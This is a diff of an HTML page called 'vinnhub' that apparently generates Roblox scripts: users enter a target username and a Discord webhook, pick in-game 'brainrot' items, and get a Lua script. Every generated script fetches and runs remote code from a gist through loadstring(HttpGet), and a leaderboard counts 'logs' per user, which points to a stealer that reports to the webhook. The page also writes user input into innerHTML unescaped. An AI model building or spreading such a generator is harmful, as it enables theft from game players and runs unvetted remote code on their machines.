@@ -15,11 +15,10 @@
     --border: #1c2130;
     --accent: #00e5ff;
     --purple: #a78bfa;
-    --discord: #5865f2;
-    --green: #10b981;
-    --danger: #f43f5e;
     --text: #dde4f0;
     --muted: #4a5568;
+    --green: #10b981;
+    --danger: #f43f5e;
   }
 
   body {
@@ -27,72 +26,65 @@
     color: var(--text);
     font-family: 'Rajdhani', sans-serif;
     min-height: 100vh;
-    overflow-x: hidden;
   }
 
   body::before {
     content: '';
     position: fixed;
     inset: 0;
-    background-image:
-      linear-gradient(rgba(0,229,255,0.025) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,229,255,0.025) 1px, transparent 1px);
-    background-size: 44px 44px;
+    background-image: linear-gradient(rgba(0,229,255,0.015) 1px, transparent 1px), linear-gradient(90deg, rgba(0,229,255,0.015) 1px, transparent 1px);
+    background-size: 50px 50px;
     pointer-events: none;
-    z-index: 0;
   }
 
   .wrap {
     position: relative;
     z-index: 1;
-    max-width: 920px;
+    max-width: 1000px;
     margin: 0 auto;
-    padding: 2rem 1.5rem 6rem;
+    padding: 2rem 1.5rem;
   }
 
   /* ── Navigation Bar ── */
   .nav-bar {
     display: flex;
     justify-content: center;
-    align-items: center;
-    gap: 1.2rem;
-    background: rgba(15, 17, 23, 0.6);
+    gap: 0.5rem;
+    background: rgba(15, 17, 23, 0.7);
     border: 1px solid var(--border);
     border-radius: 12px;
-    padding: 0.6rem 1.2rem;
-    margin-bottom: 2.5rem;
+    padding: 0.4rem;
+    margin-bottom: 3rem;
     backdrop-filter: blur(10px);
-    animation: fadeDown .5s ease both;
   }
 
   .nav-item {
     font-family: 'Share Tech Mono', monospace;
     font-size: 0.75rem;
     color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
+    padding: 0.6rem 1rem;
     cursor: pointer;
+    border-radius: 8px;
+    transition: 0.2s;
+    text-transform: uppercase;
     display: flex;
     align-items: center;
-    gap: 0.4rem;
-    transition: all 0.2s ease;
+    gap: 0.5rem;
   }
 
-  .nav-item:hover, .nav-item.active { color: var(--purple); }
+  .nav-item:hover { color: var(--text); background: rgba(255,255,255,0.03); }
   .nav-item.active {
     background: rgba(167, 139, 250, 0.1);
-    padding: 0.3rem 0.7rem;
-    border-radius: 6px;
+    color: var(--purple);
     border: 1px solid rgba(167, 139, 250, 0.2);
   }
 
-  /* ── Header ── */
-  header {
-    text-align: center;
-    margin-bottom: 3rem;
-    animation: fadeDown .55s ease both;
-  }
+  /* ── Tab System ── */
+  .tab-content { display: none; animation: fadeUp 0.4s ease both; }
+  .tab-content.active { display: block; }
 
+  /* ── Header ── */
+  header { text-align: center; margin-bottom: 3rem; }
   .live-badge {
     display: inline-flex;
     align-items: center;
@@ -103,203 +95,124 @@
     border-radius: 20px;
     font-size: 0.65rem;
     color: var(--purple);
-    margin-bottom: 1.2rem;
+    margin-bottom: 1rem;
     text-transform: uppercase;
     font-family: 'Share Tech Mono', monospace;
   }
+  h1 { font-size: 4rem; font-weight: 700; text-transform: lowercase; color: var(--purple); letter-spacing: -2px; }
 
-  h1 {
-    font-size: clamp(1.9rem, 4.5vw, 3rem);
-    font-weight: 700;
-    letter-spacing: .1em;
-    text-transform: uppercase;
-    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    line-height: 1;
-  }
+  /* ── Panels ── */
+  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 1.2rem; }
+  .ph { display: flex; align-items: center; gap: .6rem; padding: .75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
+  .ph-title { font-family: 'Share Tech Mono', monospace; font-size: .72rem; text-transform: uppercase; color: var(--muted); }
+  .pb { padding: 1.5rem; }
 
-  .tagline {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .78rem;
-    letter-spacing: .18em;
-    text-transform: uppercase;
-    color: var(--muted);
-    margin-top: .4rem;
-  }
-
-  /* ── Panel base ── */
-  .panel {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    overflow: hidden;
-    margin-bottom: 1.2rem;
-    animation: fadeUp .5s ease both;
-  }
-
-  .ph {
-    display: flex;
-    align-items: center;
-    gap: .6rem;
-    padding: .75rem 1.25rem;
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
-  }
-
-  .dot {
-    width: 7px; height: 7px;
-    border-radius: 50%;
-    flex-shrink: 0;
-    animation: blink 2.2s infinite;
-  }
-
-  .dot-cyan   { background: var(--accent);   box-shadow: 0 0 7px var(--accent); }
-  .dot-purple { background: var(--purple);   box-shadow: 0 0 7px var(--purple); animation-delay:.4s; }
-  .dot-green  { background: var(--green);    box-shadow: 0 0 7px var(--green);  animation-delay:1.2s; }
-
-  .ph-title {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: .72rem;
-    text-transform: uppercase;
-    letter-spacing: .15em;
-    color: var(--muted);
-  }
-
-  .pb { padding: 1.25rem; }
-
-  /* ── Search & Lists ── */
-  .search-row { display: flex; gap: .6rem; margin-bottom: .75rem; }
-  .search-input {
-    flex: 1; background: var(--bg); border: 1px solid var(--border); border-radius: 7px;
-    padding: .55rem .85rem; color: var(--text); font-family: 'Share Tech Mono', monospace;
-    font-size: .82rem; outline: none; transition: border-color .2s;
-  }
-  .search-input:focus { border-color: var(--accent); }
-
-  .animal-list {
-    background: var(--bg); border: 1px solid var(--border); border-radius: 8px;
-    height: 200px; overflow-y: auto; scrollbar-width: thin;
-  }
-
-  .a-item {
-    display: flex; align-items: center; gap: .65rem; padding: .48rem .9rem;
-    cursor: pointer; border-bottom: 1px solid rgba(255,255,255,.025); transition: background .12s;
-  }
-  .a-item:hover { background: rgba(0,229,255,.05); }
-  .a-item.on    { background: rgba(0,229,255,.09); }
-
-  /* ── Form Elements ── */
-  .txt {
+  /* ── Generator Specifics ── */
+  .search-input, .txt {
     width: 100%; background: var(--bg); border: 1px solid var(--border); border-radius: 8px;
-    padding: .72rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace;
-    font-size: .88rem; outline: none; margin-bottom: 0.5rem;
+    padding: .75rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace; margin-bottom: 1rem; outline: none;
   }
-  .lbl {
-    display: block; font-family: 'Share Tech Mono', monospace; font-size: .68rem;
-    text-transform: uppercase; letter-spacing: .13em; color: var(--muted); margin-bottom: .45rem;
-  }
-  .btn-sm {
-    padding: .5rem .9rem; background: rgba(0,229,255,.06); border: 1px solid rgba(0,229,255,.2);
-    border-radius: 7px; color: var(--accent); font-family: 'Share Tech Mono', monospace;
-    font-size: .68rem; cursor: pointer;
-  }
+  .animal-list { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; height: 200px; overflow-y: auto; }
+  .a-item { display: flex; align-items: center; gap: .8rem; padding: .6rem 1rem; cursor: pointer; border-bottom: 1px solid rgba(255,255,255,0.02); }
+  .a-item.on { background: rgba(167, 139, 250, 0.05); color: var(--purple); }
+
   .btn-gen {
-    display: block; width: 100%; padding: .92rem;
-    background: linear-gradient(130deg, var(--accent) 0%, #38bdf8 100%);
-    border: none; border-radius: 10px; color: #040608; font-family: 'Rajdhani', sans-serif;
-    font-size: 1.1rem; font-weight: 700; letter-spacing: .14em; text-transform: uppercase;
-    cursor: pointer; transition: all .2s; box-shadow: 0 0 26px rgba(0,229,255,.16);
-    margin-bottom: 1.2rem;
+    width: 100%; padding: 1rem; background: var(--purple); border: none; border-radius: 10px;
+    color: #000; font-family: 'Rajdhani'; font-weight: 700; text-transform: uppercase; cursor: pointer; font-size: 1.1rem;
   }
 
-  /* ── Logs ── */
-  .log-entry {
-    font-family: 'Share Tech Mono', monospace; font-size: 0.75rem; padding: 0.6rem;
-    border-bottom: 1px solid rgba(28, 33, 48, 0.5); display: flex; justify-content: space-between;
-    animation: fadeDown 0.3s ease-out;
+  /* ── Leaderboard & Log UI ── */
+  .list-row {
+    display: flex; justify-content: space-between; align-items: center;
+    background: rgba(255,255,255,0.02); padding: 1rem; border-radius: 10px; margin-bottom: 0.5rem;
+    border-left: 3px solid var(--purple);
   }
-  .log-user { color: var(--accent); }
-  .log-time { color: var(--muted); font-size: 0.65rem; }
+  .rank-badge { background: var(--surface); padding: 0.3rem 0.6rem; border-radius: 5px; font-family: 'Share Tech Mono'; font-size: 0.8rem; }
 
-  .code-block {
-    background: var(--bg); border: 1px solid var(--border); border-radius: 8px;
-    padding: 1rem 1.2rem; font-family: 'Share Tech Mono', monospace; font-size: .79rem;
-    line-height: 1.8; color: #7ecfe8; min-height: 100px; white-space: pre; overflow-x: auto;
-  }
+  .code-block { background: var(--bg); padding: 1rem; border-radius: 8px; font-family: 'Share Tech Mono'; font-size: 0.8rem; color: #7ecfe8; white-space: pre; overflow-x: auto; }
 
-  @keyframes fadeDown { from { opacity:0; transform: translateY(-10px); } to { opacity:1; transform: none; } }
-  @keyframes fadeUp   { from { opacity:0; transform: translateY(10px);  } to { opacity:1; transform: none; } }
-  @keyframes blink    { 0%,100% { opacity:1; } 50% { opacity:.3; } }
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 </style>
 </head>
 <body>
 
 <div class="wrap">
   <nav class="nav-bar">
-    <div class="nav-item active"><span>⚡</span> Generator</div>
-    <div class="nav-item"><span>📊</span> Top</div>
-    <div class="nav-item"><span>🌐</span> Global Logs</div>
-    <div class="nav-item"><span>💬</span> Chat</div>
-    <div class="nav-item"><span>🛡️</span> Ranks</div>
+    <div class="nav-item active" onclick="openTab(event, 'generator')">⚡ Generator</div>
+    <div class="nav-item" onclick="openTab(event, 'top')">📊 Top</div>
+    <div class="nav-item" onclick="openTab(event, 'logs')">🌐 Global Logs</div>
+    <div class="nav-item" onclick="openTab(event, 'chat')">💬 Chat</div>
   </nav>
 
   <header>
-    <div class="live-badge">
-      <div class="dot dot-purple" style="width:6px; height:6px;"></div>
-      LIVE • Script Generator
-    </div>
-    <div class="logo-row"><h1>Vinnhub</h1></div>
-    <p class="tagline">Roblox • Brainrot Animals • Script Generator</p>
+    <div class="live-badge"><span>●</span> LIVE • Script Generator</div>
+    <h1>vinnhub</h1>
+    <p class="tagline" style="color:var(--muted); font-family:'Share Tech Mono'; font-size:0.8rem; text-transform:uppercase; letter-spacing:2px;">Automated script generation for your Roblox</p>
   </header>
 
-  <div class="panel">
-    <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Recent Activity</span></div>
-    <div class="pb" id="logFeed" style="max-height: 160px; overflow-y: hidden;">
-      <div class="log-entry" style="color: var(--muted); justify-content: center;">No recent generations...</div>
+  <div id="generator" class="tab-content active">
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Target Configuration</span></div>
+      <div class="pb">
+        <input class="txt" id="usernameInput" type="text" placeholder="Roblox Username">
+        <input class="txt" id="webhookInput" type="text" placeholder="Discord Webhook URL">
+      </div>
     </div>
-  </div>
 
-  <div class="panel">
-    <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
-    <div class="pb">
-      <div class="search-row">
+    <div class="panel">
+      <div class="ph"><span class="ph-title">Animal Selection</span></div>
+      <div class="pb">
         <input class="search-input" id="searchBox" type="text" placeholder="Search..." oninput="filterList()">
-        <button class="btn-sm" onclick="selectAll()">All</button>
-        <button class="btn-sm" onclick="clearAll()" style="color:var(--danger)">Clear</button>
-      </div>
-      <div class="animal-list" id="animalList"></div>
-      <div style="margin-top:0.5rem; font-family:'Share Tech Mono'; font-size:0.7rem; color:var(--muted)">
-        <span id="selNum" style="color:var(--accent)">0</span> Selected
+        <div class="animal-list" id="animalList"></div>
       </div>
     </div>
-  </div>
 
-  <div class="panel">
-    <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Configuration</span></div>
-    <div class="pb">
-      <label class="lbl">Roblox Username</label>
-      <input class="txt" id="usernameInput" type="text" placeholder="Builderman" autocomplete="off">
-      <label class="lbl">Discord Webhook</label>
-      <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+    <button class="btn-gen" onclick="generate()">Generate Script</button>
+
+    <div class="panel" style="margin-top:2rem;">
+      <div class="ph"><span class="ph-title">Output</span></div>
+      <div class="pb">
+        <div class="code-block" id="outputBlock">-- Your script will appear here</div>
+      </div>
     </div>
   </div>
 
-  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
-
-  <div class="panel">
-    <div class="ph"><div class="dot dot-green"></div><span class="ph-title">Generated Script</span></div>
-    <div class="pb">
-      <div class="code-block" id="outputBlock">-- Output will appear here...</div>
+  <div id="top" class="tab-content">
+    <h2 style="text-align:center; margin-bottom:2rem;">Leaderboard</h2>
+    <div class="panel">
+      <div class="pb">
+        <div class="list-row"><div class="rank-badge">#1</div><span>anna_prz_05380</span><span style="color:var(--purple)">30,698 logs</span></div>
+        <div class="list-row"><div class="rank-badge">#2</div><span>itsmerainz</span><span style="color:var(--purple)">22,922 logs</span></div>
+        <div class="list-row"><div class="rank-badge">#3</div><span>nm_nvm</span><span style="color:var(--purple)">17,472 logs</span></div>
+      </div>
     </div>
   </div>
+
+  <div id="logs" class="tab-content">
+    <h2 style="text-align:center; margin-bottom:2rem;">Global Logs</h2>
+    <div class="panel">
+      <div class="pb" id="globalLogList">
+        <div class="list-row"><span>Nacho Spyder</span><span style="color:var(--muted)">1m ago</span></div>
+        <div class="list-row"><span>Ketchuru and Musturu</span><span style="color:var(--muted)">2m ago</span></div>
+      </div>
+    </div>
+  </div>
+
 </div>
 
 <script>
 const ANIMALS = ["1x1x1x1","25","67","Admin Lucky Block","Agarrini la Palini","Alessio","Anpali Babel","Antonio","Aquanaut","Arcadopus","Astrolero Cervalero","Avocadini Antilopini","Avocadini Guffo","Avocadorilla","Bacuru and Egguru","Ballerina Cappuccina","Ballerina Peppermintina","Ballerino Lololo","Bambini Crostini","Bambu Bambu Sahur","Bananita Dolphinita","Bananito Bandito","Bandito Axolito","Bandito Bobritto","Belula Beluga","Berenjello Angello","Bisonte Giuppitere","Blackhole Goat","Blueberrinni Octopusini","Boatito Auratito","Boba Panda","Bombardini Tortinii","Bombardiro Crocodilo","Bombombini Gusini","Boneca Ambalabu","Brainrot God Lucky Block","Brasilini Berimbini","Brr Brr Patapim","Brr es Teh Patipum","Brri Brri Bicus Dicus Bombicus","Brunito Marsito","Brutto Gialutto","Buho de Fuego","Buho de Noelo","Buho del Cielo","Bulbito Bandito Traktorito","Bunito Bunito Spinito","Bunnyman","Burbaloni Loliloli","Burguro And Fryuro","Burrito Bandito","Cacasito Satalito","Cachorrito Melonito","Cacto Hipopotamo","Capi Taco","Capitano Moby","Cappuccino Assassino","Cappuccino Clownino","Caramello Filtrello","Carloo","Carrotini Brainini","Cavallo Virtuoso","Celestial Pegasus","Celularcini Viciosini","Centrucci Nuclucci","Cerberus","Chachechi","Chef Crabracadabra","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Noelteira","Chicleteirina Bicicleteirina","Chihuanini Taconini","Chill Puppy","Chillin Chili","Chimnino","Chimpanzini Bananini","Chipso and Queso","Chocco Bunny","Chrismasmamat","Cigno Fulgoro","Clickerino Crabo","Cocoa Assassino","Cocofanto Elefanto","Cocosini Mama","Coffin Tung Tung Tung Sahur","Cooki and Milki","Corn Corn Corn Sahur","Crabbo Limonetta","Cuadramat and Pakrahmatmamat","Cupcake Koala","Cupid Cupid Sahur","Cupid Hotspot","DJ Panda","Divino Platypio","Doi Doi Do","Dolphini Jetskini","Donkeyturbo Express","Dragon Cannelloni","Dragon Gingerini","Dug dug dug","Dul Dul Dul","Dumborino Miracello","Elefanto Frigo","Esok Sekolah","Espresso Signora","Eviledon","Extinct Ballerina","Extinct Matteo","Extinct Tralalero","Festive 67","Festive Lucky Block","Fishboard","Fishino Clownino","Fizzy Soda","Fluriflura","Fragola La La La","Fragrama and Chocrama","Frankentteo","Frigo Camelo","Frio Ninja","Frogato Pirato","Frogo Elfo","GOAT","Ganganzelli Trulala","Gangster Footera","Garama and Madundung","Gato Celesto","Gattatino Nyanino","Gattito Tacoto","Giftini Spyderini","Ginger Cisterna","Ginger Gerat","Ginger Globo","Girafa Celestre","Glorbo Fruttodrillo","Gobblino Uniciclino","Gold Elf","Gorillo Subwoofero","Gorillo Watermelondrillo","Graipuss Medussi","Granchiello Spiritell","Griffin","Guerriro Digitale","Guest 666","Harpuccino","Headless Horseman","Heart Lucky Block","Ho Ho Ho Sahur","Holy Arepa","Horegini Boom","Hydra Dragon Cannelloni","Jacko Jack Jack","Jacko Spaventosa","Jackorilla","Jingle Jingle Sahur","Job Job Job Sahur","Jolly Jolly Sahur","Karker Sahur","Karkerheart Luvkur","Karkerkar Kurkur","Ketchuru and Musturu","Ketupat Bros","Ketupat Kepat","Krupuk Pagi Pagi","La Casa Boo","La Cucaracha","La Extinct Grande","La Food Combinasion","La Ginger Sekolah","La Grande Combinasion","La Jolly Grande","La Karkerkar Combinasion","La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Spooky Grande","La Supreme Combinasion","La Taco Combinasion","La Vacca Jacko Linterino","La Vacca Prese Presente","La Vacca Saturno Saturnita","Las Capuchinas","Las Sis","Las Tralaleritas","Las Vaquitas Saturnitas","Lavadorito Spinito","Lerulerulerule","Lionel Cactuseli","Lirilì Larilà","List List List Sahur","Los 25","Los 67","Los Amigos","Los Bombinitos","Los Bros","Los Burritos","Los Candies","Los Chicleteiras","Los Chihuaninis","Los Combinasionas","Los Crocodillitos","Los Cucarachas","Los Cupids","Los Gattitos","Los Hotspotsitos","Los Jobcitos","Los Jolly Combinasionas","Los Karkeritos","Los Lucky Blocks","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Noobinis","Los Nooo My Hotspotsitos","Los Orcalitos","Los Planitos","Los Primos","Los Puggies","Los Quesadillas","Los Sekolahs","Los Spaghettis","Los Spooky Combinasionas","Los Spyderinis","Los Sweethearts","Los Taco Blocks","Los Tacoritas","Los Tipi Tacos","Los Tortus","Los Tralaleritos","Los Trios","Los Tungtungtungcitos","Love Love Bear","Love Love Love Sahur","Lovin Rose","Luv Luv Luv","Magi Ribbitini","Malame Amarele","Mangolini Parrocini","Mariachi Corazoni","Mastodontico Telepiedone","Matteo","Meowl","Mi Gatito","Mieteteira Bicicleteira","Money Money Man","Money Money Puggy","Money Money Reindeer","Mummio Rappitto","Mummy Ambalabu","Mythic Lucky Block","Nacho Spyder","Naughty Naughty","Noo La Polizia","Noo my Candy","Noo my Heart","Noo my Present","Noo my examine","Noobini Pizzanini","Noobini Santanini","Nooo My Hotspot","Nuclearo Dinossauro","Odin Din Din Dun","Orangutini Ananassini","Orcaledon","Orcalero Orcala","Orcalita Orcala","Pakrahmatmamat","Pakrahmatmatina","Pandaccini Bananini","Pandanini Frostini","Paradiso Axolottino","Pengolino Nuvoletto","Penguin Tree","Penguino Cocosino","Perochello Lemonchello","Perrito Burrito","Pi Pi Watermelon","Piccione Macchina","Piccionetta Macchina","Pinealotto Fruttarino","Pipi Avocado","Pipi Corni","Pipi Kiwi","Pipi Potato","Pirulitoita Bicicleteira","Please my Present","Pop Pop Sahur","Popcuru and Fizzuru","Pot Hotspot","Pot Pumpkin","Premium Festive Lucky Block","Premium Heart Lucky Block","Puffaball","Pumpkini Spyderini","Quackula","Quesadilla Crocodila","Quesadillo Vampiro","Quivioli Ameleonni","Raccooni Jandelini","Rang Ring Bus","Reindeer Tralala","Reinito Sleighito","Rhino Helicopterino","Rhino Toasterino","Rocco Disco","Rosetti Tualetti","Rosey and Teddy","Salamino Penguino","Sammyni Fattini","Sammyni Spyderini","Santa Hotspot","Santteo","Sealo Regalo","Secret Lucky Block","Serafinna Medusella","Seraphino Gruyero","Sigma Boy","Sigma Girl","Signore Carapace","Skibidi Toilet","Skull Skull Skull","Snailenzo","Spaghetti Tualetti","Spinny Hammy","Spioniro Golubiro","Spongini Quackini","Spooky Lucky Block","Spooky and Pumpky","Squalanana","Stoppo Luminino","Strawberrelli Flamingelli","Strawberry Elephant","Svinina Bombardino","Swag Soda","Swaggy Bros","Ta Ta Ta Ta Sahur","Taco Lucky Block","Tacorillo Crocodillo","Tacorita Bicicleta","Talpa Di Fero","Tang Tang Keletang","Tartaragno","Tartaruga Cisterna","Te Te Te Sahur","Telemorte","Tentacolo Tecnico","Ti Ti Ti Sahur","Tictac Sahur","Tigrilini Watermelini","Tigroligre Frutonni","Tim Cheese","Tipi Topi Taco","Tirilikalika Tirilikalako","To to to Sahur","Tob Tobi Tobi","Toiletto Focaccino","Tootini Shrimpini","Torrtuginni Dragonfrutini","Tracoducotulu Delapeladustuz","Tractoro Dinosauro","Tralaledon","Tralalero Tralala","Tralalita Tralala","Tree Tree Tree Sahur","Trenostruzzo Turbo 3000","Trenostruzzo Turbo 4000","Tric Trac Baraboom","Trickolino","Triplito Tralaleritos","Trippi Troppi","Trippi Troppi Troppa Trippa","Trulimero Trulicina","Tuff Toucan","Tukanno Bananno","Tung Tung Tung Sahur","Unclito Samito","Urubini Flamenguini","Vampira Cappucina","Ventoliero Pavonero","Vulturino Skeletono","W or L","Wombo Rollo","Yess my examine","Yeti Claus","Zibra Zubra Zibralini","Zombie Tralala"];
 
 let selected = new Set();
+
+function openTab(evt, tabName) {
+  const contents = document.getElementsByClassName("tab-content");
+  for (let i = 0; i < contents.length; i++) contents[i].classList.remove("active");
+  const navItems = document.getElementsByClassName("nav-item");
+  for (let i = 0; i < navItems.length; i++) navItems[i].classList.remove("active");
+  document.getElementById(tabName).classList.add("active");
+  evt.currentTarget.classList.add("active");
+}
 
 function renderList(filter) {
   const q = (filter || '').toLowerCase();
@@ -309,52 +222,32 @@ function renderList(filter) {
     if (q && !name.toLowerCase().includes(q)) return;
     const row = document.createElement('div');
     row.className = 'a-item' + (selected.has(name) ? ' on' : '');
-    const cb = document.createElement('input');
-    cb.type = 'checkbox';
-    cb.checked = selected.has(name);
-    cb.style.accentColor = 'var(--accent)';
-    const lbl = document.createElement('span');
-    lbl.style.fontSize = '0.85rem';
-    lbl.textContent = name;
-    row.appendChild(cb);
-    row.appendChild(lbl);
-    row.onclick = () => toggle(name);
+    row.innerHTML = `<input type="checkbox" ${selected.has(name) ? 'checked' : ''}> <span>${name}</span>`;
+    row.onclick = () => {
+      selected.has(name) ? selected.delete(name) : selected.add(name);
+      renderList(document.getElementById('searchBox').value);
+    };
     list.appendChild(row);
   });
-  document.getElementById('selNum').textContent = selected.size;
-}
-
-function toggle(name) {
-  selected.has(name) ? selected.delete(name) : selected.add(name);
-  renderList(document.getElementById('searchBox').value);
 }
 
 function filterList() { renderList(document.getElementById('searchBox').value); }
-function selectAll()  { ANIMALS.forEach(n => selected.add(n)); renderList(); }
-function clearAll()   { selected.clear(); renderList(); }
-
-function addLog(user, count) {
-  const feed = document.getElementById('logFeed');
-  if (feed.innerText.includes("No recent")) feed.innerHTML = "";
-  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-  const entry = document.createElement('div');
-  entry.className = 'log-entry';
-  entry.innerHTML = `<span><span class="log-user">${user}</span> generated script (${count} animals)</span><span class="log-time">${time}</span>`;
-  feed.prepend(entry);
-  if (feed.children.length > 4) feed.removeChild(feed.lastChild);
-}
 
 function generate() {
-  const username = document.getElementById('usernameInput').value.trim();
-  const webhook  = document.getElementById('webhookInput').value.trim();
-  const out      = document.getElementById('outputBlock');
-  if (!username || !webhook) { alert("Fill all fields!"); return; }
-
-  addLog(username, selected.size);
-
-  const brainrotLines = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
-  const script = `getgenv().WEBHOOK_URL = "${webhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().WANTED_BRAINROTS = {\n${brainrotLines}\n}\nloadstring(game:HttpGet("https://gist.githubusercontent.com/HopeThisWorkPpp/c2788cdfd3c62296b8721e721f66b396/raw/main.lua"))()`;
-  out.textContent = script;
+  const user = document.getElementById('usernameInput').value.trim();
+  const hook = document.getElementById('webhookInput').value.trim();
+  if (!user || !hook) return alert("Fill all fields!");
+  
+  const animals = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
+  const script = `getgenv().WEBHOOK_URL = "${hook}"\ngetgenv().TARGET_USERNAME = "${user}"\ngetgenv().WANTED_BRAINROTS = {\n${animals}\n}\nloadstring(game:HttpGet("https://gist.githubusercontent.com/HopeThisWorkPpp/c2788cdfd3c62296b8721e721f66b396/raw/main.lua"))()`;
+  document.getElementById('outputBlock').textContent = script;
+  
+  // Add to local logs
+  const logList = document.getElementById('globalLogList');
+  const entry = document.createElement('div');
+  entry.className = 'list-row';
+  entry.innerHTML = `<span>${user} generated ${selected.size} animals</span><span>Just now</span>`;
+  logList.prepend(entry);
 }
 
 renderList();
